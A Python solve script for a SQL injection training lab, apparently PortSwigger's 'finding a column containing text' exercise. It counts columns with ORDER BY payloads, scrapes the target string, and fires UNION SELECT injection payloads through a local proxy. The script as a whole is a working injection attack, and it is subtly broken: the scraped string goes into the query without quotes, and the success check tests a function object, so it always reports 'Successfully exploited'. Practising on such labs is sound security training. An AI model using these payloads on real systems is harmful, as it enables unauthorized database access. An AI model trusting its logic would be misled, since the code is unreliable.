#Lab: SQL injection UNION attack, finding a column containing text

import requests
import sys 
import urllib3
from bs4 import BeautifulSoup
import re

#Disable warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Making request go through the proxy for debugging 
proxy = {"http":"http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

#Change the category to something you have in the lab
uri = "/filter?category=Gifts"

#Checking the number of columns since this is a UNION SQL injection
def count_columns(url):
    for i in range(1,21):
        payload = f"'ORDER BY {i}--"
        request = requests.get(url + uri + payload, verify=False, proxies=proxy)
        if "Internal Server Error" in request.text:
            return i - 1
    


#Getting the phrase that we need to submit in our request
def get_secret_phrase(url):
    request = requests.get(url, verify=False,proxies=proxy)
    soup = BeautifulSoup(request.text, 'html.parser')
    extracted_text = soup.find(string=re.compile('.*Make the database retrieve the string: .*'))
    if extracted_text:
        match = re.search(r'Make the database retrieve the string: (.*)', extracted_text)
        if match:
            secret = match.group(1).strip()
            return secret

#Making the middle part of the request
def making_middle_section(secret):
    middle_part_list=[]
    for i in range(1,count_columns(url)+1):
        middle_part_list.append("null")
    
    result = []
    for i in range(0, count_columns(url)):
        testing_list = middle_part_list.copy()
        testing_list[i] = secret
        result.append(",".join(testing_list))
    return result 
    
#Exploiting the app 
def exploit(url, middle_part):
    for i in range(0,len(middle_part)):
        payload = "'UNION SELECT " + middle_part[i] + " from information_schema.tables--"
        request = requests.get(url + uri + payload, verify=False, proxies=proxy)
        #Checking if the script worked
        # if "OK" in request.text:
        #     return True
        # else:
        #     return False

if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
    #Checking if count_columns is int. which would tell us that we got the number of columns
    if isinstance(count_columns(url),int):
        print(f"Successfully retrived number of columns. There are {count_columns(url)} columns")
        secret = get_secret_phrase(url)
        if isinstance(secret, str):
            print(f"Successfully retrived secret phrase. It is {secret}")
            middle_part = making_middle_section(secret)
            print("Exploiting")
            exploit(url, middle_part)
            if exploit:
                print("Successfully exploited")
            else:
                print("Something went wrong")
        else:
            print("Something went wrong. Couldn't get secret phrase")
    else:
        print("Something went wrong. Couldn't get number of columns")


    

    